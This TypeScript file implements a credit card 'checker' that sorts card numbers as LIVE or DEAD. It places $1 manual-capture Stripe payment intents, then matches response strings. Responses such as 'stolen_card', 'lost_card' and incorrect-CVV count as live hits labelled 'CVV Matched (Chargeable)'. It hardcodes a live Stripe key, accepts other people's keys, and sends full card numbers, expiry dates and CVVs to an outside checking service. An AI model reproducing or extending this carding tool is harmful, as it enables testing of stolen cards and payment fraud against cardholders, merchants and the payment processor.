
import Stripe from 'stripe';
import fetch from 'node-fetch';

// Card checker types
export interface CheckerResponse {
  success: boolean;
  message: string;
  details?: {
    brand?: string;
    last4?: string;
    funding?: string;
    country?: string;
  };
  binData?: any;
  code?: string;
  status?: string; // LIVE, DEAD, UNKNOWN
}

// ChkerAPI response interface
export interface ChkerApiResponse {
  success: boolean;
  message: string;
  result?: {
    bin?: string;
    scheme?: string;
    type?: string;
    brand?: string;
    prepaid?: boolean;
    country?: string;
    bank?: string;
    status?: string; // LIVE, DEAD, UNKNOWN
  };
}

// Error codes and their classifications - based on CC-Checker reference implementation
const LIVE_CARD_INDICATORS = [
  'cvc_check: pass',
  'succeeded',
  'requires_payment_method',
  'authentication',
  'authentication_required',
  'requires_capture',
  'payment_intent_unexpected_state',
  'security code is incorrect',
  'security_code_incorrect',
  'Your card\'s security code is incorrect',
  'incorrect_cvc',
  'stolen_card',
  'lost_card',
  'Your card has insufficient funds'
];

const DEAD_CARD_INDICATORS = [
  'pickup_card',
  'insufficient_funds',
  'Your card has expired',
  'expired_card',
  'Your card number is incorrect',
  'Your card was declined',
  'card_declined',
  'do_not_honor',
  'transaction_not_allowed',
  'generic_decline',
  'Your card\'s security code is invalid',
  'invalid_cvc',
  'card_not_supported', 
  'Your card\'s expiration month is invalid',
  'Your card\'s expiration year is invalid',
  'Your card is not supported',
  'Your card\'s security code is not correct',
  'currency_not_supported',
  'call_issuer',
  'fraudulent',
  'Try Again Later',
  'invalid_account'
];

export class CardChecker {
  private stripe?: Stripe; // Make optional as it's only initialized with secret keys
  private publicKey: string = "pk_live_B3imPhpDAew8RzuhaKclN4Kd"; // Default public key
  private userStripeKey?: string; // User provided Stripe secret key
  
  constructor(stripeKey: string) {
    // If no key is provided, use the default public key
    const keyToUse = stripeKey || this.publicKey;
    
    // Check if the key is a public key or secret key
    const isPublicKey = keyToUse.startsWith('pk_');
    
    // Store the key for API calls
    this.publicKey = keyToUse;
    
    if (!isPublicKey) {
      // For secret keys, initialize Stripe normally (for Node.js server-side use)
      this.stripe = new Stripe(keyToUse, { apiVersion: '2023-10-16' as any });
    }
    
    // For public keys, we don't initialize the Stripe object
    // Instead, we'll use fetch API directly with public key in the checkCard method
    console.log(`CardChecker initialized with ${isPublicKey ? 'public' : 'secret'} key`);
  }
  
  // Set user provided Stripe key (for custom checker)
  setUserStripeKey(key: string) {
    this.userStripeKey = key;
  }
  
  // Check card using the external API.CHKER.CC service
  async checkCardWithChkerAPI(cardParams: {
    number: string;
    expMonth: number;
    expYear: number;
    cvc: string;
  }): Promise<CheckerResponse> {
    try {
      // Clean card number
      const cleanCardNumber = cardParams.number.replace(/\s+/g, '');
      
      // Format expiry date to MM/YY
      const expMonth = cardParams.expMonth.toString().padStart(2, '0');
      const expYear = cardParams.expYear.toString().slice(-2);
      
      // Make API request to chker.cc
      const response = await fetch('https://api.chker.cc/card', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          card: cleanCardNumber,
          month: expMonth,
          year: expYear,
          cvv: cardParams.cvc
        })
      });
      
      if (!response.ok) {
        throw new Error(`API error: ${response.status} ${response.statusText}`);
      }
      
      const apiResponse = await response.json() as ChkerApiResponse;
      
      // Get BIN data
      let binData = null;
      try {
        binData = await this.lookupBIN(cleanCardNumber);
      } catch (binError) {
        console.error('BIN lookup failed:', binError);
      }
      
      // Extract the last 4 digits
      const last4Digits = cleanCardNumber.slice(-4);
      
      // Determine status from API response
      const status = apiResponse.result?.status || 'UNKNOWN';
      const isSuccess = status === 'LIVE';
      
      // Create the card details
      const detailsObj = {
        brand: apiResponse.result?.brand || binData?.brand || 'Unknown',
        last4: last4Digits,
        funding: apiResponse.result?.type || binData?.type || 'Unknown',
        country: apiResponse.result?.country || (binData?.country?.name || 'Unknown')
      };
      
      return {
        success: isSuccess,
        message: apiResponse.message || (isSuccess ? 'Card is valid' : 'Card validation failed'),
        details: detailsObj,
        binData,
        code: status.toLowerCase(),
        status
      };
    } catch (error: any) {
      // Get BIN data despite error
      let binData = null;
      try {
        binData = await this.lookupBIN(cardParams.number.replace(/\s+/g, ''));
      } catch (binError) {
        console.error('BIN lookup failed during error handling:', binError);
      }
      
      return {
        success: false,
        message: error.message || 'API validation failed',
        code: 'api_error',
        binData,
        status: 'UNKNOWN'
      };
    }
  }
  
  // Check card with user-provided Stripe key
  async checkCardWithCustomKey(
    cardDetails: {
      number: string;
      expMonth: number;
      expYear: number;
      cvc: string;
      name?: string;
    },
    customKey: string
  ): Promise<CheckerResponse> {
    // Validate key format
    if (!customKey || (!customKey.startsWith('sk_') && !customKey.startsWith('pk_'))) {
      return {
        success: false,
        message: 'Invalid Stripe key format. Please provide a valid Stripe secret (sk_*) or public key (pk_*).',
        code: 'invalid_key',
        status: 'UNKNOWN'
      };
    }
    
    // Create a temporary Stripe instance with the user's key
    let tempStripe: Stripe | null = null;
    const isPublicKey = customKey.startsWith('pk_');
    
    if (!isPublicKey) {
      try {
        tempStripe = new Stripe(customKey, { apiVersion: '2023-10-16' as any });
      } catch (error) {
        return {
          success: false,
          message: 'Invalid Stripe secret key or API initialization error.',
          code: 'invalid_key',
          status: 'UNKNOWN'
        };
      }
    }
    
    // Store original keys
    const originalPublicKey = this.publicKey;
    const originalStripe = this.stripe;
    
    // Set temporary keys
    this.publicKey = isPublicKey ? customKey : originalPublicKey;
    this.stripe = tempStripe || originalStripe;
    
    try {
      // Use standard checkCard method with the temporary configuration
      const result = await this.checkCard(cardDetails);
      
      // Attach source information to the result
      result.message = `[Custom Key] ${result.message}`;
      
      return result;
    } finally {
      // Restore original keys
      this.publicKey = originalPublicKey;
      this.stripe = originalStripe;
    }
  }
  
  // Standard card checking method (with Stripe)
  async checkCard(cardDetails: {
    number: string;
    expMonth: number;
    expYear: number;
    cvc: string;
    name?: string;
  }): Promise<CheckerResponse> {
    try {
      // Clean card number
      const cleanCardNumber = cardDetails.number.replace(/\s+/g, '');
      
      // Detect if we're using public key or secret key
      const isPublicKey = this.publicKey.startsWith('pk_');
      
      let token: any;
      let paymentMethod: any;
      let paymentIntent: any;
      
      if (isPublicKey) {
        // Using public key, we'll make direct API calls like the CC-Checker does
        try {
          // First create a token to validate card format
          const tokenResponse = await fetch('https://api.stripe.com/v1/tokens', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'Authorization': `Bearer ${this.publicKey}`
            },
            body: new URLSearchParams({
              'card[number]': cleanCardNumber,
              'card[exp_month]': cardDetails.expMonth.toString(),
              'card[exp_year]': cardDetails.expYear.toString(),
              'card[cvc]': cardDetails.cvc
            }).toString()
          });
          
          token = await tokenResponse.json();
          
          if (token.error) {
            throw new Error(token.error.message || 'Invalid card');
          }
          
          // Create payment method with token
          const paymentMethodResponse = await fetch('https://api.stripe.com/v1/payment_methods', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'Authorization': `Bearer ${this.publicKey}`
            },
            body: new URLSearchParams({
              'type': 'card',
              'card[token]': token.id
            }).toString()
          });
          
          paymentMethod = await paymentMethodResponse.json();
          
          if (paymentMethod.error) {
            throw new Error(paymentMethod.error.message || 'Payment method creation failed');
          }
          
          // Create a test payment intent (similar to what CC-Checker does)
          const paymentIntentResponse = await fetch('https://api.stripe.com/v1/payment_intents', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'Authorization': `Bearer ${this.publicKey}`
            },
            body: new URLSearchParams({
              'amount': '100',
              'currency': 'usd',
              'payment_method': paymentMethod.id,
              'confirm': 'true',
              'capture_method': 'manual'
            }).toString()
          });
          
          paymentIntent = await paymentIntentResponse.json();
        } catch (error: any) {
          throw error;
        }
      } else if (this.stripe) {
        // Using secret key with Stripe SDK
        // First create a token to validate card format
        const tokenParams: any = {
          card: {
            number: cleanCardNumber,
            exp_month: cardDetails.expMonth,
            exp_year: cardDetails.expYear,
            cvc: cardDetails.cvc,
            name: cardDetails.name || undefined
          }
        };
        
        token = await this.stripe!.tokens.create(tokenParams);
        
        // If token creation is successful, try creating a payment method
        paymentMethod = await this.stripe!.paymentMethods.create({
          type: 'card',
          card: {
            token: token.id,
          },
        });
        
        // Create a $1 PaymentIntent to verify if card is active
        paymentIntent = await this.stripe!.paymentIntents.create({
          amount: 100, // $1.00
          currency: 'usd',
          payment_method: paymentMethod.id,
          confirm: true,
          capture_method: 'manual', // Set to manual to avoid actual charges
        });
      } else {
        // This shouldn't happen - we should always have either public key API or Stripe SDK
        throw new Error('No Stripe client available for card checking');
      }
      
      // Get BIN data
      let binData = null;
      try {
        binData = await this.lookupBIN(cleanCardNumber);
      } catch (binError) {
        console.error('BIN lookup failed:', binError);
      }
      
      // Check status by looking for specific patterns in the response
      // Convert payment intent to string for pattern matching
      const paymentIntentStr = JSON.stringify(paymentIntent);
      
      // Create log of the card details to include with response
      const cardLog = {
        brand: token.card?.brand || undefined,
        last4: token.card?.last4 || undefined,
        funding: token.card?.funding || undefined,
        country: token.card?.country || undefined
      };
      
      // First, cancel the payment intent to avoid accidental charges (if chargeable)
      if (paymentIntent.status === 'requires_capture') {
        if (isPublicKey) {
          // Cancel using direct API call with public key
          await fetch(`https://api.stripe.com/v1/payment_intents/${paymentIntent.id}/cancel`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'Authorization': `Bearer ${this.publicKey}`
            }
          });
        } else if (this.stripe) {
          // Cancel using Stripe library with secret key
          await this.stripe!.paymentIntents.cancel(paymentIntent.id);
        }
      }
      
      // Check for live card indicators
      if (paymentIntent.status === 'requires_capture' || 
          LIVE_CARD_INDICATORS.some(indicator => 
            paymentIntentStr.includes(indicator) ||
            (paymentIntent.last_payment_error?.message && 
             paymentIntent.last_payment_error.message.includes(indicator)) ||
            (paymentIntent.last_payment_error?.code && 
             paymentIntent.last_payment_error.code.includes(indicator)))) {
              
        // Card is considered LIVE
        const message = paymentIntent.status === 'requires_capture' 
          ? 'CVV Matched (Chargeable)' 
          : paymentIntent.last_payment_error?.message?.includes('security code') 
            ? 'CCN Matched (Incorrect CVV)'
            : 'Card Valid (Live)';
            
        return {
          success: true,
          message,
          details: cardLog,
          binData,
          code: paymentIntent.last_payment_error?.code || paymentIntent.status,
          status: 'LIVE'
        };
      } 
      // Check for dead card indicators
      else if (DEAD_CARD_INDICATORS.some(indicator => 
              paymentIntentStr.includes(indicator) ||
              (paymentIntent.last_payment_error?.message && 
               paymentIntent.last_payment_error.message.includes(indicator)) ||
              (paymentIntent.last_payment_error?.code && 
               paymentIntent.last_payment_error.code.includes(indicator)))) {
               
        // Card is considered DEAD
        return {
          success: false,
          message: paymentIntent.last_payment_error?.message || 'Card Declined',
          details: cardLog,
          binData,
          code: paymentIntent.last_payment_error?.code || 'card_declined',
          status: 'DEAD'
        };
      }
      // No specific pattern found, treat as UNKNOWN
      else {
        return {
          success: false,
          message: paymentIntent.last_payment_error?.message || 'Unknown Card Status',
          details: cardLog,
          binData,
          code: paymentIntent.last_payment_error?.code || paymentIntent.status,
          status: 'UNKNOWN'
        };
      }
    } catch (error: any) {
      // Get BIN data despite error
      let binData = null;
      try {
        binData = await this.lookupBIN(cardDetails.number.replace(/\s+/g, ''));
      } catch (binError) {
        console.error('BIN lookup failed during error handling:', binError);
      }
      
      // Check if the error message or code matches any of our live indicators
      const errorMessage = error.message || '';
      const errorCode = error.code || '';
      
      // Classify based on error message/code
      let status = 'UNKNOWN';
      let success = false;
      
      if (LIVE_CARD_INDICATORS.some(indicator => 
          errorMessage.includes(indicator) || errorCode.includes(indicator))) {
        status = 'LIVE';
        success = true;
      } else if (DEAD_CARD_INDICATORS.some(indicator => 
                errorMessage.includes(indicator) || errorCode.includes(indicator))) {
        status = 'DEAD';
      }
      
      return {
        success,
        message: error.message || 'Card validation failed',
        code: error.code || 'card_declined',
        binData: binData,
        status
      };
    }
  }
  
  private async lookupBIN(binNumber: string): Promise<any> {
    try {
      // Get first 6-8 digits (BIN)
      const bin = binNumber.slice(0, 8);
      
      // Use binlist.net API
      const response = await fetch(`https://lookup.binlist.net/${bin}`);
      
      if (!response.ok) {
        console.error(`BIN lookup failed: ${response.status} ${response.statusText}`);
        return null;
      }
      
      return await response.json();
    } catch (error) {
      console.error('Error during BIN lookup:', error);
      return null;
    }
  }
}
